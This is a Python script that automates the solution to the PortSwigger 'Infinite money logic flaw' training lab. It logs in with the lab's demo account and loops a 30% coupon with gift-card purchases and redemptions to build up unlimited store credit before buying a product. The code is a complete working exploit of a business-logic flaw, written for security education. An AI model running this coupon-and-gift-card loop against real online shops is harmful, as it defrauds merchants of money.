# Infinite money logic flaw

# https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	return csrf

def connect_as_wiener(s, url):
	print('\n[+] Trying to connect to the application as Wiener...')
	login_path = url + '/login'
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	data_login = {'username': 'wiener', 'password': 'peter', 'csrf': csrf_token}
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: wiener' in r.text:
		print('[+] Successfully connected as Wiener !')
		return r
	else:
		print('[-] Exploit failed to connect as Wiener <!>')
		sys.exit(1)

def add_money(s, url):
	print('\n[+] Trying to add money buying Gift Cards and using coupons...')

	gift_card_data = {"productId": "2", "redir": "PRODUCT", "quantity": "1"}
	cart_path = url + '/cart'
	coupon_path = url + '/cart/coupon'
	checkout_path = url + '/cart/checkout'
	validation_path = url + '/cart/order-confirmation?order-confirmed=true'
	gift_card_path = url + '/gift-card'
	total = '1'
	while int(total) < 1338:
		print('\n[+] Adding $10 Gift Card to cart...')
		r = s.post(cart_path, data=gift_card_data)
		r = s.get(cart_path)
		csrf_token = get_csrf_token(r)
		coupon_data = {"csrf": csrf_token, "coupon": "SIGNUP30"}
		print('[+] Applying -30% coupon...')
		r = s.post(coupon_path, data=coupon_data)
		checkout_data = {'csrf': csrf_token}
		print('[+] Buying $10 Gift Card for $7...')
		r = s.post(checkout_path, data=checkout_data, allow_redirects=False)
		r = s.get(validation_path)
		card_code = re.search("<th>Code</th>\n                            </tr>\n                            <tr>\n                                <td>(.*?)</td>", r.text).group(1)
		print('[+] Gift Card Code:\t%s' % card_code)
		card_code_data = {"csrf": csrf_token, "gift-card": card_code}
		r = s.post(gift_card_path, data=card_code_data, allow_redirects=False)
		print('[+] Using $10 Gift Card...')
		r = s.get(cart_path)
		time.sleep(1)
		total = re.search(r'<strong>Store credit: \$(.*)\.(.*)</strong>', r.text).group(1).replace('$', '')
		print(f' - Credit: {total}')


def add_to_cart(s, url):
	print('\n[+] Trying to add "Lightweight l33t leather jacket" to cart...')
	cart_path = url + '/cart'
	cart_data = {'productId': '1', 'redir': 'CART', 'quantity': '1'}
	r = s.post(cart_path, data=cart_data)
	time.sleep(1)
	total = re.search(r'<th>(-?\$.*)\.(.*)</th>', r.text).group(1).replace('$', '')
	print(cart_data)
	print(f' - Total price: {total}')
	return total

def checkout(s, url, total):
	print(f'\n[+] Trying to checkout "Lightweight l33t leather jacket" for ${total}...')
	cart_path = url + '/cart'
	checkout_path = url + '/cart/checkout'
	r = s.get(cart_path)
	csrf_token = get_csrf_token(r)
	checkout_data = {'csrf': csrf_token}
	r = s.post(checkout_path, data=checkout_data)
	time.sleep(1)
	if 'Your order is on its way!' in r.text:
		print('[+] Order validated !')

	time.sleep(1)
	return r


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Infinite money logic flaw')
	parser = argparse.ArgumentParser(description="[+] Lab: Infinite money logic flaw")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(args.url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to buy "Lightweight l33t leather jacket" using $10 gift cards and -30% coupons to add store credits...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(args.url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			r = connect_as_wiener(s, url)
			r = add_money(s, url)
			total = add_to_cart(s, url)
			checkout(s, url, total)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
